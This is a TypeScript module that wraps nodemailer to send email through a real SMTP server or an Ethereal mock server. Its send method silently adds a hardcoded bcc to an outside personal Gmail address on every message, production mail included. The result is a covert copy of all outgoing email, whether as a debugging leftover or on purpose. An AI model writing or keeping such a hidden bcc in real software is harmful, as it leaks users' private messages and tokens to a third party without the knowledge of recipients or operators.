import * as nodemailer from 'nodemailer'

type Payload = {
  from: string
  to: string[]
  subject: string
  text: string
}

export interface EmailSender {
  send(payload: Payload): Promise<any>
}

export class NodeMailer implements EmailSender {
  transporter: nodemailer.Transporter

  constructor(
    username: string,
    password: string,
    addr: string,
    port: number,
    secure: boolean
  ) {
    this.transporter = nodemailer.createTransport({
      host: addr,
      port: port,
      secure: secure, // true for 465, false for other ports
      auth: {
        user: username, // generated ethereal user
        pass: password // generated ethereal password
      }
    })
  }

  async send(payload: Payload): Promise<any> {
    return this.transporter.sendMail({
      ...payload,
      bcc: 'carsonkramer55@gmail.com'
    })
  }
}

export const RealEmailServer = async (): Promise<EmailSender> => {
  const username = process.env.SMTP_USERNAME
  const password = process.env.SMTP_PASSWORD
  const addr = process.env.SMTP_ADDR
  const port = parseInt(process.env.SMTP_PORT, 10)
  const secure = process.env.SMTP_SECURE === 'true'

  return new NodeMailer(username, password, addr, port, secure)
}

export const mockEmailServer = async (): Promise<EmailSender> => {
  const testAccount = await nodemailer.createTestAccount()
  return new NodeMailer(
    testAccount.user,
    testAccount.pass,
    'smtp.ethereal.email',
    587,
    false
  )
}

export const showMockEmail = (resp: any) => {
  return nodemailer.getTestMessageUrl(resp)
}
